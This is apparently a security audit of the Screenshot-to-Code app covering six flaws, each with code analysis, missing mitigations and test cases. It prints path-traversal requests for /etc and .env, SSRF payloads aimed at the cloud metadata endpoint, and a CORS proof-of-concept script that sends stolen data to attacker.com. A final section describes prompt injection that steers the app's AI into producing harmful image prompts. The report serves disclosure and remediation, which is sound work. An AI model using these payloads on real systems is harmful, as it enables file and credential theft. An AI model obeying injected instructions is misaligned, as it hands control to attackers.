# Security Vulnerabilities in Screenshot-to-Code

## 1. Path Traversal in Evaluation Routes

### Vulnerability name
Path Traversal Vulnerability in Evals Routes

### Description
The `/evals`, `/pairwise-evals`, and `/best-of-n-evals` endpoints in the backend API accept folder paths as parameters without proper path validation or sanitization. An attacker can exploit this to traverse the directory structure and access sensitive files outside the intended directories.

Step by step to trigger vulnerability:
1. Identify one of the evaluation endpoints (e.g., `/evals`)
2. Craft a request with a folder parameter containing path traversal sequences (e.g., `?folder=../../../etc`)
3. The application attempts to access files in the specified directory
4. The application returns file contents or information that should not be accessible

### Impact
**Critical**. This vulnerability allows attackers to read arbitrary files on the server's filesystem to which the application has access. This could lead to exposure of:
- Sensitive configuration files (including API keys)
- System files containing sensitive information
- The server's directory structure
- Source code files that might contain hardcoded credentials
- Other confidential data

### Vulnerability rank
High to Critical

### Currently implemented mitigations
The code includes basic validation to check if the folder exists but does not prevent path traversal attacks:
```python
folder_path = Path(folder)
if not folder_path.exists():
    raise HTTPException(status_code=404, detail=f"Folder not found: {folder}")
```

### Missing mitigations
- Path normalization and validation
- Restriction to specific allowed directories (whitelist approach)
- Sanitization of user-supplied path parameters
- Implementation of proper access controls for evaluation endpoints

### Preconditions
- Attacker needs access to the backend API endpoints
- No authentication is required to access these endpoints
- The evaluation endpoints must be publicly accessible

### Source code analysis
In `routes/evals.py`, several endpoints accept folder paths directly from user input:

```python
@router.get("/evals", response_model=list[Eval])
async def get_evals(folder: str):
    if not folder:
        raise HTTPException(status_code=400, detail="Folder path is required")

    folder_path = Path(folder)
    if not folder_path.exists():
        raise HTTPException(status_code=404, detail=f"Folder not found: {folder}")

    try:
        evals: list[Eval] = []
        # Get all HTML files from folder
        files = {
            f: os.path.join(folder, f)
            for f in os.listdir(folder)
            if f.endswith(".html")
        }
        # ... continues processing files ...
```

The vulnerability is also present in the `get_pairwise_evals` endpoint:

```python
@router.get("/pairwise-evals", response_model=PairwiseEvalResponse)
async def get_pairwise_evals(
    folder1: str = Query(..., description="Absolute path to first folder"),
    folder2: str = Query(..., description="Absolute path to second folder"),
):
    if not os.path.exists(folder1) or not os.path.exists(folder2):
        return {"error": "One or both folders do not exist"}
```

The application directly uses these folder paths with `os.path.join()` and `os.listdir()` without restricting the paths to a specific directory. This allows an attacker to provide paths like `../../../etc` to access files in unauthorized locations.

### Security test case
1. Identify the `/evals` endpoint in the backend
2. Create a GET request to `/evals?folder=../../../etc`
3. Observe if the server returns file listings from the `/etc` directory
4. If successful, try accessing specific sensitive files:
   - `GET /evals?folder=../../.env` (to access API keys)
   - `GET /evals?folder=../` (to access the parent directory)
5. For the `/pairwise-evals` endpoint:
   - Send a request: `GET /pairwise-evals?folder1=../../../etc&folder2=../../../var`
   - Check if the response contains information from both directories

## 2. Server-Side Request Forgery (SSRF) in Screenshot Endpoint

### Vulnerability name
Server-Side Request Forgery (SSRF) in Screenshot API

### Description
The `/api/screenshot` endpoint takes a user-supplied URL and forwards it to an external screenshot service without adequate validation. This allows an attacker to make the server initiate requests to arbitrary hosts, including internal network resources.

Step by step to trigger vulnerability:
1. Identify the `/api/screenshot` API endpoint
2. Create a POST request with a malicious URL targeting internal resources
3. The server forwards this URL to the external screenshot service
4. The service attempts to access the specified URL, potentially reaching internal resources

### Impact
**High**. This vulnerability allows attackers to:
- Scan and probe internal network services
- Access metadata services in cloud environments (like AWS metadata service at 169.254.169.254)
- Bypass network security controls
- Access services on the internal network that aren't accessible from the internet
- Potentially gain access to sensitive internal systems or information
- Perform attacks on third-party services that trust the server's IP address

### Vulnerability rank
High

### Currently implemented mitigations
None. The endpoint simply forwards the user-supplied URL to the screenshot service without validation.

### Missing mitigations
- URL validation to allow only public web addresses
- Blocking of private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, etc.)
- Blocking of localhost references and internal domain names
- Request timeouts to prevent long-running SSRF attacks
- Whitelisting of allowed domains or URL patterns

### Preconditions
- Access to the `/api/screenshot` API endpoint
- A valid API key for the screenshot service (required parameter)
- The application must be publicly accessible

### Source code analysis
In `routes/screenshot.py`, the application takes a URL from the request body and passes it directly to a screenshot service:

```python
@router.post("/api/screenshot")
async def app_screenshot(request: ScreenshotRequest):
    # Extract the URL from the request body
    url = request.url  # User-provided URL
    api_key = request.apiKey

    # No validation performed on the URL
    image_bytes = await capture_screenshot(url, api_key=api_key)
    data_url = bytes_to_data_url(image_bytes, "image/png")
    return ScreenshotResponse(url=data_url)
```

The `capture_screenshot` function simply forwards this URL to the external screenshot service:

```python
async def capture_screenshot(target_url: str, api_key: str, device: str = "desktop") -> bytes:
    api_base_url = "https://api.screenshotone.com/take"
    params = {
        "access_key": api_key,
        "url": target_url,  # Unvalidated URL is used here
        # Other parameters...
    }
    async with httpx.AsyncClient(timeout=60) as client:
        response = await client.get(api_base_url, params=params)
        # ...
```

An attacker could supply internal network addresses like `http://192.168.1.1`, `http://localhost:8080`, or `http://169.254.169.254/` (AWS metadata service) to probe the network.

### Security test case
1. Setup a local HTTP server to capture incoming requests
2. Create a POST request to `/api/screenshot` with the following payload:
   ```json
   {"url": "http://your-test-server-address:port/ssrf-test", "apiKey": "valid-api-key"}
   ```
3. Verify that your test server receives a request, confirming the SSRF vulnerability
4. Test with various internal addresses to demonstrate the scope of the vulnerability:
   ```json
   {"url": "http://localhost:8080", "apiKey": "valid-api-key"}
   ```
   ```json
   {"url": "http://169.254.169.254/latest/meta-data/", "apiKey": "valid-api-key"}
   ```
5. Test with various internal IP ranges (10.0.0.0/8, 192.168.0.0/16, etc.)

## 3. Exposure of API Keys via WebSocket Communication

### Vulnerability name
API Key Exposure Through Client-Side Transmission

### Description
The application accepts API keys (OpenAI, Anthropic, etc.) from client-side requests rather than securely storing them on the server. When a user calls the `/generate-code` WebSocket endpoint, they can provide API keys in the request parameters, which the server then uses to make requests to third-party services.

Step by step to trigger vulnerability:
1. Connect to the WebSocket endpoint `/generate-code`
2. Send a JSON payload containing API keys in the parameters (`openAiApiKey`, `anthropicApiKey`)
3. The server extracts these keys from the request using the `get_from_settings_dialog_or_env` function
4. The keys are then used for API calls to external services

### Impact
**High**. This design creates several security risks:
- API keys transmitted over the network can be intercepted by attackers monitoring network traffic
- Keys may be exposed in browser history, logs, or debugging tools
- If there's any XSS vulnerability in the application, it could be used to steal API keys
- Keys could be compromised by man-in-the-middle attacks or malicious browser extensions

An attacker who obtains these API keys could:
- Use them to make unauthorized requests to OpenAI, Anthropic, or other services
- Incur usage charges on the victim's account
- Access any data the victim has stored with these services

### Vulnerability rank
High

### Currently implemented mitigations
The application attempts to use environment variables first before falling back to user-provided keys.

### Missing mitigations
- Server-side encryption of API keys
- Token-based proxy system to avoid sending raw API keys to the frontend
- Secure session handling for API keys
- Remove the ability to accept API keys from client requests
- Store all API keys securely on the server (environment variables, secure vaults, etc.)
- Add a proper authentication mechanism to ensure only authorized users can use the service

### Preconditions
- User must provide API keys through the settings dialog
- Attacker must be able to intercept WebSocket communication or access browser storage

### Source code analysis
In `routes/generate_code.py`, the application extracts API keys from client requests:

```python
def get_from_settings_dialog_or_env(
    params: dict[str, str], key: str, env_var: str | None
) -> str | None:
    value = params.get(key)
    if value:
        print(f"Using {key} from client-side settings dialog")
        return value

    if env_var:
        print(f"Using {key} from environment variable")
        return env_var

    return None
```

The function first attempts to use the key from the client request parameters (`params.get(key)`). Only if that's not provided does it fall back to using environment variables.

This is used to extract keys:

```python
openai_api_key = get_from_settings_dialog_or_env(
    params, "openAiApiKey", OPENAI_API_KEY
)

anthropic_api_key = get_from_settings_dialog_or_env(
    params, "anthropicApiKey", ANTHROPIC_API_KEY
)
```

These keys are then used directly for API calls:

```python
tasks.append(
    stream_openai_response(
        prompt_messages,
        api_key=openai_api_key,
        base_url=openai_base_url,
        callback=lambda x, i=index: process_chunk(x, i),
        model=model,
    )
)
```

This approach exposes the raw API keys to potential interception in transit or by malicious browser extensions.

### Security test case
1. Open the application in a browser
2. Set up a network traffic monitoring tool (like Wireshark or a proxy like Burp Suite)
3. Add API keys via the settings dialog
4. Submit a request for code generation
5. Observe the WebSocket traffic between the client and server
6. Verify that the API keys are visible in the request payload
7. Document how easily an attacker monitoring network traffic could extract these keys
8. Check if these keys are also stored in browser localStorage or sessionStorage

## 4. Permissive CORS Configuration

### Vulnerability name
Permissive CORS Configuration

### Description
The application's CORS configuration allows requests from any origin (`"*"`) and includes credentials. This overly permissive configuration could allow malicious websites to make cross-origin requests to the API with the user's authentication credentials.

Step by step to trigger vulnerability:
1. Create a malicious website that makes cross-origin requests to the application's API
2. Include credentials in the request
3. When a user visits the malicious site while authenticated to the application, the malicious site can make authenticated requests

### Impact
**High**. This vulnerability could enable cross-site request forgery (CSRF) attacks, allowing malicious websites to make authenticated requests to the API on behalf of users who visit the attacker's site.

### Vulnerability rank
High

### Currently implemented mitigations
None. The CORS configuration is completely permissive.

### Missing mitigations
- Restriction of allowed origins to trusted domains
- Removal of `allow_credentials=True` if wildcard origins are necessary
- Implementation of CSRF tokens for sensitive operations

### Preconditions
- The backend service must be publicly accessible
- User must visit a malicious website while logged into the application

### Source code analysis
In `main.py`, the CORS middleware is configured with the following settings:

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

This configuration allows any website to make cross-origin requests to the API, including credentials (cookies, HTTP authentication). According to CORS security best practices, using `allow_origins=["*"]` with `allow_credentials=True` is especially dangerous and actually violates the CORS specification.

### Security test case
1. Create a malicious HTML page with JavaScript that makes a fetch request to the backend API:
   ```html
   <script>
   fetch('http://backend-server:7001/generate-code', {
     method: 'POST',
     credentials: 'include',
     body: JSON.stringify({
       // malicious payload
     })
   })
   .then(response => response.json())
   .then(data => {
     // Send the data to attacker's server
     fetch('https://attacker.com/steal', {
       method: 'POST',
       body: JSON.stringify(data)
     });
   });
   </script>
   ```
2. Host this page on a different domain
3. When a user who is authenticated to the backend visits this page, the malicious script can make authenticated requests to the API
4. Verify that the request succeeds despite coming from a different origin

## 5. Unrestricted File Upload in Video Processing

### Vulnerability name
Unrestricted File Upload in Video Processing

### Description
The application allows users to upload video files that are subsequently processed into screenshots without proper validation of the file content, size, or format. The video processing functionality in `video/utils.py` accepts base64-encoded data URLs from users and writes them directly to the file system before processing.

Step by step to trigger vulnerability:
1. Connect to the WebSocket endpoint at `/generate-code`
2. Provide a malicious video file encoded as a base64 data URL in the `image` parameter
3. Set `inputMode` to "video"
4. The server decodes the data URL without proper validation
5. The decoded content is written to a temporary file using `tempfile.NamedTemporaryFile`
6. The temporary file is processed using the `VideoFileClip` function from the `moviepy` library

### Impact
This vulnerability allows attackers to upload specially crafted video files that could potentially:
- Exploit vulnerabilities in the video processing libraries (MoviePy, FFmpeg)
- Cause excessive resource consumption by uploading extremely large or malformed files
- Potentially achieve remote code execution if the underlying libraries have unpatched vulnerabilities

### Vulnerability rank
High

### Currently implemented mitigations
There are no effective mitigations implemented. The code uses `tempfile.NamedTemporaryFile` with `delete=True` which helps clean up the temporary file after processing, but this doesn't prevent the vulnerability from being exploited.

### Missing mitigations
1. File type validation based on content inspection, not just MIME type
2. File size limitations to prevent excessive resource consumption
3. Content validation before processing
4. Sandboxing the video processing operation
5. Rate limiting video uploads

### Preconditions
- The attacker must have access to the WebSocket endpoint `/generate-code`
- The video processing feature must be enabled

### Source code analysis
The vulnerability exists in the `video/utils.py` file:

```python
def split_video_into_screenshots(video_data_url: str) -> list[Image.Image]:
    # Decode the base64 URL to get the video bytes
    video_encoded_data = video_data_url.split(",")[1]
    video_bytes = base64.b64decode(video_encoded_data)

    mime_type = video_data_url.split(";")[0].split(":")[1]
    suffix = mimetypes.guess_extension(mime_type)

    with tempfile.NamedTemporaryFile(suffix=suffix, delete=True) as temp_video_file:
        print(temp_video_file.name)
        temp_video_file.write(video_bytes)
        temp_video_file.flush()
        clip = VideoFileClip(temp_video_file.name)
        # ... processing continues ...
```

The key issues are:
1. The function accepts any base64-encoded data URL without validation
2. The MIME type is extracted from the data URL, which can be easily forged
3. The suffix for the temporary file is determined using `mimetypes.guess_extension(mime_type)` without verifying that it matches the actual content
4. The decoded bytes are written to the file system without any content validation
5. The `VideoFileClip` function is called on the temporary file, which could process malicious content

### Security test case
1. Create a specially crafted malicious video file (e.g., a file with a known FFmpeg vulnerability)
2. Encode the file as a base64 data URL: `data:video/mp4;base64,<base64-encoded malicious content>`
3. Connect to the WebSocket endpoint at `/generate-code`
4. Send a JSON payload with:
   ```json
   {
     "image": "data:video/mp4;base64,<base64-encoded malicious content>",
     "inputMode": "video",
     "generatedCodeConfig": "html_tailwind",
     "generationType": "create"
   }
   ```
5. Observe if the server experiences abnormal behavior, crashes, or executes unexpected code

## 6. Prompt Injection in Image Generation

### Vulnerability name
Prompt Injection in Image Generation

### Description
The application uses user-generated content as input for AI image generation, without sufficient filtering or validation. Specifically, alt text from HTML images is extracted and used as prompts for DALL-E 3 or Flux image generation APIs. An attacker can craft a screenshot or request that manipulates the AI into generating code with malicious alt text, which is then used to generate potentially harmful or inappropriate images.

Step by step to trigger vulnerability:
1. Create a screenshot or request that contains elements designed to manipulate the AI
2. Send this input to the application's code generation endpoint
3. The AI generates HTML code with image tags containing attacker-controlled alt text
4. The application extracts these alt texts and uses them as prompts for image generation
5. Malicious or inappropriate images are generated using the third-party image generation API

### Impact
This vulnerability could allow attackers to:
- Generate offensive, inappropriate, or illegal images through the application
- Bypass content filters by crafting prompts that appear benign but produce harmful content
- Potentially cause reputational damage to the service provider
- Generate images that could create legal liability for the service provider (copyright infringement, inappropriate content, etc.)
- Increase costs by generating unnecessary or malicious images through paid APIs

### Vulnerability rank
High

### Currently implemented mitigations
The application does not implement any content filtering or validation for the alt text used as image generation prompts.

### Missing mitigations
1. Content filtering for image alt text before using it as prompts
2. Rate limiting for image generation requests
3. Prompt sanitization to remove potentially harmful instructions
4. Implementation of a prompt allow-list or pattern validation
5. Human review for generated images in sensitive contexts

### Preconditions
- The attacker must be able to provide input to the code generation endpoint
- Image generation must be enabled (controlled by the `should_generate_images` parameter)
- The application must be configured with valid API keys for image generation services

### Source code analysis
The vulnerability exists in the interaction between the code generation and image generation components. In `image_generation/core.py`, the `generate_images` function:

```python
async def generate_images(
    code: str,
    api_key: str,
    base_url: Union[str, None],
    image_cache: Dict[str, str],
    model: Literal["dalle3", "flux"] = "dalle3",
) -> str:
    # Find all images
    soup = BeautifulSoup(code, "html.parser")
    images = soup.find_all("img")

    # Extract alt texts as image prompts
    alts: List[str | None] = []
    for img in images:
        # Only include URL if the image starts with https://placehold.co
        # and it's not already in the image_cache
        if (
            img["src"].startswith("https://placehold.co")
            and image_cache.get(img.get("alt")) is None
        ):
            alts.append(img.get("alt", None))

    # Exclude images with no alt text
    filtered_alts: List[str] = [alt for alt in alts if alt is not None]

    # Remove duplicates
    prompts = list(set(filtered_alts))
```

This function extracts alt text from images in the generated HTML code and uses them directly as prompts for image generation via the `process_tasks` function, which then calls either `generate_image_dalle` or `generate_image_replicate` depending on the model.

The critical issue is that alt text from the generated HTML (which is influenced by user input) is directly used as prompts for image generation without validation or filtering.

### Security test case
1. Create a carefully crafted input designed to manipulate the code generation AI into producing HTML with malicious alt text
2. Example input:
   ```
   Create a webpage with an image. The alt text for the image should be: "A picture of [insert inappropriate content description here] in photorealistic style"
   ```
3. Send this input to the WebSocket endpoint at `/generate-code` with parameters:
   ```json
   {
     "image": "[data URL of crafted input]",
     "inputMode": "image",
     "generatedCodeConfig": "html_tailwind",
     "generationType": "create",
     "isImageGenerationEnabled": true
   }
   ```
4. Observe the generated code to confirm that it contains image tags with the injected alt text
5. Verify if the application uses these alt texts as prompts for image generation
6. Check if inappropriate or harmful images are generated as a result
